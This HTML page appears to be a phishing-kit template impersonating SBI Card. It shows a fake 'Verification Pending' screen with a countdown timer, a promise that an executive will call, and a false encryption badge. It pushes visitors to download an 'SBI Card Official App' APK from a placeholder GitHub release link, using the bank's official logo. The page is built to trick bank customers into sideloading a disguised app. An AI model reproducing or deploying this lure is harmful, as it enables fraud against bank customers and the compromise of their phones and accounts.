<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Status</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: 'Segoe UI', Roboto, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .wrapper { width: 90%; max-width: 400px; background: #ffffff; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid rgba(0,0,0,0.05); padding-bottom: 20px; }

        .header { background: #1a237e; color: #fff; padding: 40px 20px; text-align: center; }
        .logo-box { width: 70px; height: 70px; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.2); border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; }
        
        .progress-area { padding: 0 20px; text-align: center; }
        .loader { width: 60px; height: 60px; border-radius: 50%; border: 6px solid #f3f3f3; border-top: 6px solid #3949ab; margin: 20px auto; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .status-card { background: #f8f9fa; padding: 20px; border-radius: 20px; border-left: 5px solid #1a237e; margin: 20px 0; }
        .contact-msg { color: #1a237e; font-weight: bold; margin-top: 10px; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .timer-text { font-size: 26px; font-weight: 800; color: #1a237e; font-family: monospace; }
        
        /* APK Card Styling */
        .apk-card { display: flex; align-items: center; background: #ffffff; padding: 15px; border-radius: 16px; border: 1px solid #e0e0e0; margin: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); transition: 0.3s; }
        .apk-card:hover { box-shadow: 0 8px 15px rgba(0,0,0,0.1); }
        .apk-icon { width: 45px; height: 45px; background: #f9f9f9; display: flex; align-items: center; justify-content: center; border-radius: 12px; margin-right: 15px; padding: 5px; border: 1px solid #eee; }
        .apk-info { flex: 1; text-align: left; }
        .apk-info h3 { margin: 0; font-size: 15px; color: #333; }
        .apk-info p { margin: 2px 0 0; font-size: 12px; color: #888; }
        .download-arrow { width: 35px; height: 35px; background: #e8eaf6; color: #1a237e; display: flex; align-items: center; justify-content: center; border-radius: 50%; }

        .footer { padding: 20px; text-align: center; font-size: 11px; color: #888; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="header">
        <div class="logo-box"><i class="fa-solid fa-university" style="font-size: 30px; color: #fff;"></i></div>
        <h2 style="margin:0;">Verification Pending</h2>
    </div>

    <!-- Clickable APK Card -->
    <a href="https://github.com/YOUR_USERNAME/REPO/releases/download/v1.0.0/SBI_Card_Services.apk" style="text-decoration: none; color: inherit;">
        <div class="apk-card">
            <div class="apk-icon">
                <img src="img/main_logo.png" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/c/cc/SBI-logo.svg/1200px-SBI-logo.svg.png'" style="width: 100%; height: 100%; object-fit: contain;">
            </div>
            <div class="apk-info">
                <h3>SBI Card Official App</h3>
                <p>Version 1.0.0 • 5MB</p>
            </div>
            <div class="download-arrow">
                <i class="fa-solid fa-arrow-down"></i>
            </div>
        </div>
    </a>

    <div class="progress-area">
        <div class="loader"></div>
        <p style="color: #444; font-weight: 600;">System is analyzing your documents...</p>
        
        <div class="status-card">
            <div style="font-size: 11px; color: #666; letter-spacing: 1px;">ESTIMATED TIME REMAINING</div>
            <div class="timer-text" id="timer">23:59:59</div>
            <div class="contact-msg">
                <i class="fa-solid fa-headset"></i> Our executive will contact you soon.
            </div>
        </div>
    </div>

    <div class="footer">
        <p><i class="fa-solid fa-lock"></i> Secured by 256-bit AES Encryption</p>
    </div>
</div>

<script>
    let time = 86399;
    const timerElement = document.getElementById('timer');
    setInterval(() => {
        let h = Math.floor(time / 3600);
        let m = Math.floor((time % 3600) / 60);
        let s = time % 60;
        timerElement.innerText = `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        if (time > 0) time--;
    }, 1000);
</script>

</body>
</html>
